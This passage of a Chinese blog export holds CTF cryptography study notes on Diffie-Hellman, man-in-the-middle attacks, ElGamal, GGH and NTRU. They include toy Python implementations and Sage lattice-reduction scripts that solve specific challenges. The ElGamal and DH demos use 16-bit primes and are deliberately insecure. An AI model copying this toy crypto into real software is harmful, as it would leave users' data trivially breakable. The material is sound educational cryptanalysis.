class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, pi):</span><br><span class="line">            <span class="keyword">if</span> find_t(a, i, pi) == <span class="number">1</span> <span class="keyword">and</span> i &lt; pi - <span class="number">1</span>:</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> flag <span class="keyword">and</span> find_t(a, i, pi) == <span class="number">1</span> <span class="keyword">and</span> i == pi - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;素数p :&quot;</span>, p)</span><br><span class="line">g = primitive_root(p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;生成元g是 : &quot;</span>, g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 私钥生成</span></span><br><span class="line">x = randint(<span class="number">1</span>, p)</span><br><span class="line">y = randint(<span class="number">1</span>, p)</span><br><span class="line"></span><br><span class="line">TA = l_pow(g, x, p)</span><br><span class="line">TB = l_pow(g, y, p)</span><br><span class="line"></span><br><span class="line">KA = l_pow(TA, y, p)</span><br><span class="line">KB = l_pow(TB, x, p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> KA == KB</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;密钥交换成功，你的私钥很安全&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>运行的结果是<br><img alt="DH协议及ElGamal加密方案的实现-f7c0a2dc.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-f7c0a2dc.png" width="" height="" ></p>
<p>看来以后还要看看怎么有效找生成元的算法（其实sage里面早就有了，看文末）</p>
<p>所以小节一下，显然AB共享的来自两个随机生成的随机数，两人并不能控制其内容，所以作为密钥更为合理</p>
<h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><p>虽然DH方案本身挺好好，但之所以说它没有的使用，是因为存在中间人攻击</p>
<p>（从网上抄来的，因为觉得自己对这个还有点模糊，但看了之后清楚一些）<br>其攻击思路如下：</p>
<ol>
<li>Alice发送公钥$T_A$给Bob, 中间人Eve截取该值，并选择了一个自己的私钥$z$，计算出自己的公钥$_C=g^c\bmod\ q$然后发送自己的公钥给Bob</li>
<li>Bob向Alice传递自己的公钥$T_B$时，也被中间人Eve截获该值，Eve代替Bob发送它自己的公共值$T_C$给Alice</li>
<li>此时，Alice收到中间人Eve的公钥，Alice和EVE计算出会话密钥$K_{AC}=g^{xz}\bmod\ q$，Bob也收到中间人发送的公钥，Bob和Eve计算出会话密钥$K_{BC}=g^{yz}\bmod\ q$</li>
<li>Alice和Bob都以为是和对方协商好了会话密钥，于是双方互相发送数据，Alice用$K_{AC}$加密数据之后发送给Bob，Eve截获该数据，用$K_{AC}$解密，即可查看Alice发送给Bob的数据，Eve还可对其进行修改，然后用$K_{BC}$加密发送给Bob，这时Bob收到的消息已经被中间人Eve窥探甚至篡改，但Bob对此毫不知情</li>
</ol>
<p>这就是中间人攻击的原理，妙，给我感觉DH协议具有传递性哈哈哈哈哈哈</p>
<p>这里的理解需要注意几点，我一开始就是没搞清楚这个，举个例子就是，Alice不能100%肯定自己手中的共享私钥就是Bob手中的那个，而且他们没有办法确认，这就是一开始接触密码学里的那条悖论</p>
<blockquote>
<p>对称密码，用秘密（私钥）守护秘密（明文），那怎么能确保前一个秘密的安全性，不会被Eve监听呢；如果既然有保护第一个秘密（私钥）的方法，那为什么不用这个方法来保护第二个秘密（明文）呢</p>
</blockquote>
<p>密码学还讲博弈</p>
<h2 id="ElGamal加密方案"><a href="#ElGamal加密方案" class="headerlink" title="ElGamal加密方案"></a>ElGamal加密方案</h2><p>最后终于到了我们的ElGamal加密算法，讲完DH，ElGamal其实已经讲完一半了</p>
<p>因为ElGamal和DH真的好像，正如老师上课说的，DH他们怎么就没想到ElGamal呢，明明只是一步之遥（当然是大牛的一步）</p>
<p>视觉疲劳了，先写代码，拿出我们熟悉的long_to_bytes，bytes_to_long</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long <span class="keyword">as</span> b2n, long_to_bytes <span class="keyword">as</span> n2b</span><br><span class="line"><span class="keyword">from</span> sage <span class="keyword">import</span> l_pow, my_inverse</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_t</span>(<span class="params">a, m, n</span>):</span></span><br><span class="line">    _y = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> m &gt; <span class="number">0</span>:</span><br><span class="line">        r = m % <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>:</span><br><span class="line">            _y = (_y * a) % n</span><br><span class="line">        a = a * a % n</span><br><span class="line">        m = m // <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> _y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">primitive_root</span>(<span class="params">pi</span>):</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, pi):</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, pi):</span><br><span class="line">            <span class="keyword">if</span> find_t(a, i, pi) == <span class="number">1</span> <span class="keyword">and</span> i &lt; pi - <span class="number">1</span>:</span><br><span class="line">                flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> flag <span class="keyword">and</span> find_t(a, i, pi) == <span class="number">1</span> <span class="keyword">and</span> i == pi - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;素数p :&quot;</span>, p)</span><br><span class="line">g = primitive_root(p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;生成元g是 : &quot;</span>, g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># key generation</span></span><br><span class="line">x = randint(<span class="number">1</span>, p)</span><br><span class="line">y = randint(<span class="number">1</span>, p)</span><br><span class="line"></span><br><span class="line">TA = l_pow(g, x, p)</span><br><span class="line">TB = l_pow(g, y, p)</span><br><span class="line"></span><br><span class="line">pk = [p, g, TA]</span><br><span class="line">sk = x</span><br><span class="line"></span><br><span class="line"><span class="comment"># encryption</span></span><br><span class="line">flag = <span class="string">b&quot;f&quot;</span></span><br><span class="line">m = b2n(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line">ci = l_pow(g, y, p)</span><br><span class="line">ciphertext = m * l_pow(TA, y, p) % p</span><br><span class="line"></span><br><span class="line"><span class="comment"># decryption</span></span><br><span class="line">mi = ciphertext * my_inverse(l_pow(ci, x, p), p) % p</span><br><span class="line"><span class="built_in">print</span>(n2b(mi))</span><br></pre></td></tr></table></figure>

<p>由于求生成元的问题所限制，p不能取得太大，这也就连带着明文不能太长，不能超过16位比特，屑，这能加密个啥</p>
<p>但好歹最后的结果是一样的</p>
<img alt="DH协议及ElGamal加密方案的实现-586e337d.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-586e337d.png" width="" height="" >

<p>手写了一下加密解密过程，打公式太耗时了</p>
<img alt="DH协议及ElGamal加密方案的实现-966d65b9.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-966d65b9.png" width="" height="">

<p>应该可以理解，主要就是用DH里面的共享私钥乘以明文m进行加密，然后把共享私钥作为密文的一部分发送，然后除以（这里相当于求逆元）共享私钥就是明文了</p>
<p>所以说，ElGamal才会和DH那么有关联，密钥共享共享的就是ElGamal里面的密钥</p>
<p>那么这样Alice和Bob就能通过明文对进行验证了，中间人即使改变了私钥和Alice与Bob分别建立链接，但是依旧无法知晓明文的内容，因为只有x才能将明文解密，Eve只能创造一个z，而Alice和Bob却可以通过解密出来的内容是否是乱码检查是否存在中间人（我的理解）</p>
<h2 id="求原根的有效方法"><a href="#求原根的有效方法" class="headerlink" title="求原根的有效方法"></a>求原根的有效方法</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">gp (<span class="string">&#x27;znprimroot(&#x27;</span>+<span class="built_in">str</span>(p)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line"><span class="comment"># 或</span></span><br><span class="line">pari (<span class="string">&#x27;znprimroot(&#x27;</span>+<span class="built_in">str</span>(p)+<span class="string">&#x27;)&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>emmmmm好吧当我没说<br><img alt="DH协议及ElGamal加密方案的实现-c224eccd.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/DH协议及ElGamal加密方案的实现-c224eccd.png" width="" height=""></p>
<p>或许可以参考<a href="https://blog.csdn.net/weixin_44932880/article/details/106555427">这个博客里的</a></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>关于ElGamal和DH的关系，到这里想必都已经挺透彻的了，DLP保证了私钥的安全性即知道$g^x$，得不到x，DH则保证了有$g^x，g^y$也得不到$g^{xy}$</p>
<p>这就应证了，ElGamal基于DH，DH基于DL</p>
]]></content>
      <categories>
        <category>CTF-Crypto</category>
        <category>Crypto-TopologyTree</category>
      </categories>
      <tags>
        <tag>DH协议</tag>
        <tag>Elgamal</tag>
      </tags>
  </entry>
  <entry>
    <title>GGH</title>
    <url>/posts/4dab5237/</url>
    <content><![CDATA[<p>参考博客</p>
<p><a href="https://lazzzaro.github.io/2020/11/07/crypto-%E6%A0%BC%E5%AF%86%E7%A0%81/">https://lazzzaro.github.io/2020/11/07/crypto-格密码/</a></p>
<p><a href="https://www.math.auckland.ac.nz/~sgal018/crypto-book/crypto-book.html">https://www.math.auckland.ac.nz/~sgal018/crypto-book/crypto-book.html</a></p>
<p><a href="https://hxp.io/blog/26/VolgaCTF-2016-Quals-crypto300-XXY-writeup/">https://hxp.io/blog/26/VolgaCTF-2016-Quals-crypto300-XXY-writeup/</a></p>
<p><a href="https://blog.soreatu.com/posts/intended-solution-to-ggh-in-gyctf-2020/#%E9%A2%98%E7%9B%AEwriteup">https://blog.soreatu.com/posts/intended-solution-to-ggh-in-gyctf-2020/#题目writeup</a></p>
<span id="more"></span>

<h1 id="GGH"><a href="#GGH" class="headerlink" title="GGH"></a>GGH</h1><h2 id="GGH加密系统"><a href="#GGH加密系统" class="headerlink" title="GGH加密系统"></a>GGH加密系统</h2><p>基于格的CVP（最近接向量问题）设计的非对称密码算法</p>
<p>是有缺陷滴</p>
<ul>
<li><p><strong>生成密钥</strong></p>
<p>选取格$L$中的一组好基$B$和一个幺模矩阵$U$作为私钥，计算$L$的另一组基$B’=UB$作为公钥</p>
<p>选定$M$值，明文向量$(m_1,m_2,\cdots,m_n)$，$m_i\in (-M,\ M)$</p>
</li>
<li><p><strong>加密</strong></p>
<ol>
<li>给定明文$m=(m_1,m_2,\cdots,m_n)$，误差向量$e$（3或者-3），和公钥$B’$，计算$v=m\cdot B’=\sum\limits^n_{i=1}{m_ib_i’}$</li>
<li>密文：$c=v+e=m\cdot B’+e$</li>
</ol>
</li>
<li><p><strong>解密</strong></p>
<ol>
<li><p>计算$c\cdot B^{-1}=(m\cdot B’+e) B^{-1}=m\cdot U\cdot B\cdot B^{-1}+e\cdot B^{-1}=m\cdot U+e\cdot B^{-1}$</p>
</li>
<li><p>如果$e\cdot B^{-1}$足够小，可以利用啥啥啥啥啥去除（哈哈</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211108203306039.png" alt="image-20211108203306039"></p>
</li>
<li><p>最后计算$m=m\cdot U\cdot U^{-1}$</p>
</li>
</ol>
</li>
</ul>
<h2 id="TASK"><a href="#TASK" class="headerlink" title="TASK"></a>TASK</h2><h3 id="陇原战疫-easytask"><a href="#陇原战疫-easytask" class="headerlink" title="[陇原战疫] easytask"></a>[陇原战疫] easytask</h3><p>虽然可以爆</p>
<p>这里相当于我们就误差向量不知道了，按照加密系统是可以直接解密的，但是题目的误差向量是<code>[-3,3]</code>而不是<code>&#123;-3,3&#125;</code>（好像不是关键？</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211108210325405.png" alt="image-20211108210325405"></p>
<p>直接跑la佬的脚本不太行，像上面说的直接<code>LLL</code>就更不行</p>
<p>啥玩意就秒出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">B = W.stack(e).augment(vector([<span class="number">0</span>] * W.ncols() + [<span class="number">1</span>]))</span><br><span class="line">d = IntegerLattice(B).shortest_vector()</span><br><span class="line"></span><br><span class="line">m = W.solve_left(<span class="built_in">list</span>(e)[<span class="number">0</span>] - d[:-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<p>第一行就是把e作为最后一行添加到W里，并在最右侧添加一列，所谓的嵌套技术</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211108210450224.png" alt="image-20211108210450224"></p>
<p>然后对这个矩阵做一个<code>shortest_vector</code>，用<code>LLL</code>就可以</p>
<p>所以嵌套技术可以在一定程度上加快<code>LLL</code>，但也取决于误差向量的大小，直接这样也出了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211108211341657.png" alt="image-20211108211341657"></p>
<p>为啥子为啥子，资料链接我贴在最上面了（先溜</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211108211115528.png" alt="image-20211108211115528"></p>
<hr>
<p>又滚回来了，上面la佬博客里的<code>Babai</code>，官方WP就是用这个的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">babai</span>(<span class="params">A, w</span>):</span></span><br><span class="line">    A = A.LLL()</span><br><span class="line">    G = A.gram_schmidt()[<span class="number">0</span>]</span><br><span class="line">    t = w</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(A.nrows())):</span><br><span class="line">        c = ((t * G[i]) / (G[i] * G[i])).<span class="built_in">round</span>()</span><br><span class="line">        t -= A[i] * c</span><br><span class="line">    <span class="keyword">return</span> w - t</span><br></pre></td></tr></table></figure>

<p>先<code>LLL</code>然后正交化，然后emmmmm不懂</p>
<p>先寄了</p>
<p>（所以为什么GGH的误差向量一定要<code>&#123;-3,3&#125;</code>呢</p>
<h3 id="GYCTF-2020-GGH"><a href="#GYCTF-2020-GGH" class="headerlink" title="[GYCTF 2020] GGH"></a>[GYCTF 2020] GGH</h3><p><em>别用shell会变得不幸</em></p>
<p>soreatu师傅在博客里推导过Nguyen’s Attack的原理，模6比模3可以让误差向量的影响更小，然后用嵌套</p>
<p>所以上面陇原杯的被魔改，误差向量不是<code>&#123;-3,3&#125;</code>，就不能模6了，也就是Nguyen’s Attack不合适</p>
<p>偷个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Read ciphertext and public key from the 2 given files.</span></span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ciphertext.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().strip(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    c =  [<span class="built_in">int</span>(num) <span class="keyword">for</span> num <span class="keyword">in</span> data.split(<span class="string">&#x27; &#x27;</span>)]</span><br><span class="line">c = vector(ZZ, c)</span><br><span class="line"></span><br><span class="line">B = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;key.pub&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        line = line.strip(<span class="string">&#x27; \n&#x27;</span>)</span><br><span class="line">        B.append([<span class="built_in">int</span>(num) <span class="keyword">for</span> num <span class="keyword">in</span> line.split(<span class="string">&#x27; &#x27;</span>)])</span><br><span class="line">B = matrix(ZZ, B)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nguyen&#x27;s Attack.</span></span><br><span class="line">n = <span class="number">150</span></span><br><span class="line">delta = <span class="number">3</span></span><br><span class="line">s = vector(ZZ, [delta]*n)</span><br><span class="line">B6 = B.change_ring(Zmod(<span class="number">2</span>*delta))</span><br><span class="line">left = (c + s).change_ring(Zmod(<span class="number">2</span>*delta))</span><br><span class="line">m6 = (B6.solve_left(left)).change_ring(ZZ)</span><br><span class="line">new_c = (c - m6*B) * <span class="number">2</span> / (<span class="number">2</span>*delta)</span><br><span class="line"></span><br><span class="line"><span class="comment"># embedded technique</span></span><br><span class="line">new_B = (B*<span class="number">2</span>).stack(new_c).augment(vector(ZZ, [<span class="number">0</span>]*n + [<span class="number">1</span>]))</span><br><span class="line">new_B = new_B.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">new_B_BKZ = new_B.BKZ()</span><br><span class="line">shortest_vector = new_B_BKZ[<span class="number">0</span>]</span><br><span class="line">mbar = (B*<span class="number">2</span>).solve_left(new_c - shortest_vector[:-<span class="number">1</span>])</span><br><span class="line">m = mbar * (<span class="number">2</span>*delta) + m6</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, m[:<span class="number">42</span>])))</span><br></pre></td></tr></table></figure>

<h3 id="VolgaCTF-2016-Quals-crypto300-“XXY”"><a href="#VolgaCTF-2016-Quals-crypto300-“XXY”" class="headerlink" title="[VolgaCTF 2016 Quals] crypto300 “XXY”"></a>[VolgaCTF 2016 Quals] crypto300 “XXY”</h3><p>比较早的题目了，直接嵌套然后LLL就可以出</p>
]]></content>
      <categories>
        <category>CTF-Crypto</category>
        <category>Crypto-TopologyTree</category>
      </categories>
      <tags>
        <tag>格密码</tag>
        <tag>GGH</tag>
      </tags>
  </entry>
  <entry>
    <title>NTRU</title>
    <url>/posts/a2b6ecd3/</url>
    <content><![CDATA[<p>参考博客：</p>
<p><a href="https://lazzzaro.github.io/2020/11/07/crypto-%E6%A0%BC%E5%AF%86%E7%A0%81/">https://lazzzaro.github.io/2020/11/07/crypto-格密码/</a></p>
<p><a href="https://xz.aliyun.com/t/7163">https://xz.aliyun.com/t/7163</a></p>
<p><a href="https://dawn-whisper.hack.best/2021/03/18/Lattice_learning2/">https://dawn-whisper.hack.best/2021/03/18/Lattice_learning2/</a></p>
<span id="more"></span>

<h1 id="NTRU"><a href="#NTRU" class="headerlink" title="NTRU"></a>NTRU</h1><p>据说可以抵抗量子计算机</p>
<h2 id="NTRU密码系统"><a href="#NTRU密码系统" class="headerlink" title="NTRU密码系统"></a>NTRU密码系统</h2><p><em>from la佬</em></p>
<p>准备$N,p,q$，和四个次数为$N-1$的整系数多项式$L_f,L_g,L_f,L_m$</p>
<p>$N$为素数，$(p,\ q)=1$，但$p,\ q$不必是素数，且$q$远大于$p$</p>
<p>NTRU工作于多项式整数环$\mathbb{R}=\mathbb{Z}[x]/(x^N-1)$，当$F\in \mathbb{R}$，可以把$F$表示为多项式或向量形式<br>$$<br>F=\sum^{N-1}_{i=0}F_ix^i=[F_0,F_1,\cdots,F_{N-1}]<br>$$<br>选取三个确定的整数$d_f,d_g,d_{\varphi}$，多项式集合$L_f=L(d_f,d_{f-1})$，$L_g=L(d_g,d_g)$，$L_{\varphi}=L(d_{\varphi},d_\varphi)$</p>
<p>这里记</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211102160447632.png" alt="image-20211102160447632"></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211102160509278.png" alt="image-20211102160509278"></p>
<ul>
<li><p><strong>密钥生成</strong></p>
<p>B随机选择两个多项式$f$和$g$，$f\in L_f$，$g\in L_g$，要求$f$关于模$p$和$q$的逆$F_p$，$F_q$都存在，即$F_q\times f\equiv 1\ (mod\ q)$和$F_p\times f\equiv 1\ (mod\ p)$</p>
<p>这里可以用拓展欧几里德算法算出$F_p$和$F_q$。为此，$f$首先应该满足$(f(1),\ pq)=1$，如果有一个逆不存在，需重新选择$f$</p>
<p>然后B计算$h\equiv F_q\times g\ (mod\ q)$，则公钥为$h$，私钥为$f$，$F_p$</p>
</li>
<li><p><strong>加密</strong></p>
<p>假设A发送的消息为$m\in L_m$，A根据参数$d_{\varphi}$随机选择一个$\varphi\in L_{\varphi}$，然后A利用B的公钥$h$计算<br>$$<br>e\equiv\varphi \times h+m\ (mod\ q)<br>$$<br>A将密文$e$发给$B$</p>
</li>
<li><p><strong>解密</strong></p>
<p>当B收到密文$e$，他首先利用私钥$f$计算<br>$$<br>a\equiv f\times e\ (mod\ q)<br>$$<br>选择$a$的系数位于$[-\frac{p-1}{2},\ \frac{p-1}{2}]$之间，然后计算</p>
<p>$b\equiv a(mod\ p)$</p>
<p>$c\equiv F_p\times b(mod p)$</p>
<p>则多项式$c$就是明文$m$</p>
</li>
</ul>
<hr>
<h2 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h2><h3 id="NTRUE"><a href="#NTRUE" class="headerlink" title="NTRUE"></a>NTRUE</h3><p><em>来自先知，来自巅峰极客</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    p = getStrongPrime(<span class="number">2048</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = getRandomNBitInteger(<span class="number">1024</span>)</span><br><span class="line">        g = getStrongPrime(<span class="number">768</span>)</span><br><span class="line">        h = gmpy2.invert(f, p) * g % p</span><br><span class="line">        <span class="keyword">return</span> (p, f, g, h)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">plaintext, p, h</span>):</span></span><br><span class="line">    m = bytes_to_long(plaintext)</span><br><span class="line">    r = getRandomNBitInteger(<span class="number">1024</span>)</span><br><span class="line">    c = (r * h + m) % p</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p, f, g, h = generate()</span><br><span class="line">c = encrypt(flag, p, h)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;cipher.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;h = &quot;</span> + <span class="built_in">str</span>(h) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;p = &quot;</span> + <span class="built_in">str</span>(p) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;c = &quot;</span> + <span class="built_in">str</span>(c) + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>题目代码倒是非常简单，和上面有所不同，这里的NTRU对应整数域，但除少了个$p$以外大同小异</p>
<p>知道了参数$p$，公钥$h$，以及密文$c$</p>
<p>$h=f^{-1}\times g\ mod\ p$</p>
<p>$c=r\times f^{-1}\times g+m\ mod\ p$</p>
<p>师傅的思路很清楚，首先证明了知道$f$和$g$，在没有$r$的情况下也可以算出$m$，就是<br>$$<br>m=(c\cdot f)_p\times f^{-1}\ mod\ g<br>$$</p>
<p>其次用格求解最短向量，下面复述一遍，终于有点搞懂格是什么东西了</p>
<hr>
<h4 id="格（lattice）"><a href="#格（lattice）" class="headerlink" title="格（lattice）"></a>格（lattice）</h4><p>首先是线性代数</p>
<p>给定一组线性无关的基向量 $v_1,v_2,\cdots,v_n$，那么这些基向量的所有线性组合<br>$$<br>a_1v_1+a_2v_2+\cdots+a_nv_n,\ a_i\in \mathbb{R}<br>$$<br>所组成的集合，就叫做这组基向量所张成的空间</p>
<p>然后格和这个很像</p>
<p>给定一组线性无关的基向量 $v_1,v_2,\cdots,v_n$，那么这些基向量的所有<strong>整数系数</strong>线性组合<br>$$<br>a_1v_1+a_2v_2+\cdots+a_nv_n,\ a_i\in \mathbb{Z}<br>$$<br>所形成的集合，就叫做这组基向量所张成的格</p>
<p>如果二维空间是这样的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211102191752417.png" alt="image-20211102191752417"></p>
<p>那么二维的格就是离散的二维空间</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211102191904415.png" alt="image-20211102191904415"></p>
<p>其中<br>$$<br>\begin{bmatrix}<br>i’ \\<br>j’<br>\end{bmatrix}=\begin{bmatrix}<br>1 &amp; 1 \\<br>-2 &amp; -1<br>\end{bmatrix}=\begin{bmatrix}<br>1 &amp; 1 \\<br>-2 &amp; -1<br>\end{bmatrix}\begin{bmatrix}<br>1 &amp; 0 \\<br>0 &amp; 1<br>\end{bmatrix}=T\begin{bmatrix}<br>i \\<br>j<br>\end{bmatrix}<br>$$<br>（emmmmm，某大树说离散数学就是计算机科学的天花板，好像很有道理</p>
<p>那么给一个格密码一个完整的定义</p>
<h4 id="格密码"><a href="#格密码" class="headerlink" title="格密码"></a>格密码</h4><p>线性独立空间上有集合 $v_1,v_2,\cdots,v_n\in \mathbb{R^n}$，格，这些向量的线性组合，用公式表示为：<br>$$<br>L=\{a_1v_1+a_2v_2+\cdots +a_nv_n\ |\ a_1,a_2,\cdots,a_n\in \mathbb{Z}\}<br>$$<br>格$L$的<strong>维数</strong>等于格中向量的个数</p>
<p>假定 $v_1,v_2,\cdots,v_n$ 是格$L$的基，$w_1,\ w_2,\cdots w_n\in L$，则必然存在整系数$a_{ij}$使得</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211102200017660.png" alt="image-20211102200017660"></p>
<p>成立，这样格的问题就是矩阵计算了</p>
<p>在格里有两个知名的难题</p>
<ul>
<li><strong>SVP（最短向量问题）</strong>：给定lattice和基向量，找到lattice中的一个长度最短的非零向量，即寻找一个$v\in L$满足其欧几里德范数$||v||$最小</li>
<li><strong>CVP（最近向量问题）</strong>：给定lattice和基向量，以及一个不在lattice上的目标向量，找到lattice中一个距离目标向量最近的格向量，即对于一个非格$L$中的向量$w$，在格$L$中寻找一个向量$v$，使得$||w-v||$最小</li>
</ul>
<p>和RSA的基于大整数分解一样，也是难题吧，所以可以作为密码系统的基石</p>
<p>但就和RSA某些特殊情况相似，该题是2维的且有参数的故意设置，所以是可以求的，用到的就是<code>LLL</code>算法，当然还有别的一些</p>
<hr>
<p>我们知道$h=f^{-1}\times g\ mod\ p$，变换一下就是<br>$$<br>h\cdot f\equiv g\ (mod\ p)<br>$$<br>改写成等式<br>$$<br>h\cdot f=k\cdot p+g<br>$$<br>将$k\cdot p$移到左边，得<br>$$<br>h\cdot f-k\cdot p=g<br>$$<br>引入矩阵<br>$$<br>(f,-k)M=(f,-k)\begin{bmatrix}<br>1 &amp; h \\<br>0 &amp; p<br>\end{bmatrix}=(f,\ f\cdot h-k\cdot p)=(f,g)<br>$$<br>这说明什么呢，说明$(f,g)$就是一个以$M$为基底的格上的向量？</p>
<p>然后通过比较大小</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211102194547113.png" alt="image-20211102194547113"></p>
<p>所以，解决这个格以$M$为基底的格的最短向量问题，这道题也就被解出</p>
<p>直接用sage的话，构造一个这样的矩阵<br>$$<br>\begin{bmatrix}<br>1 &amp; h \\<br>0 &amp; p<br>\end{bmatrix}<br>$$<br>然后用LLL算法求出来的就是$f$和$g$，那就直接出了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">h = <span class="number">7257231567493321493497732423756001924698993879741072696808433246581786362611889417289029671240997843541696187487722285762633068287623369923457879458577466240950224087015909821079480431797917376609839097610864517760515986973340148901898582075413756737310797402537478388864632901178463429574227279668004092519322204990617969134092793157225082977967228366838748193084097651575835471869030934527383379794480007872562067799484905159381690179011192017159985260435844246766711550315143517066359521598424992244464723490166447105679062078049379153154659732304112563255058750656946353654402824529058734270363154894216317570784</span></span><br><span class="line">p = <span 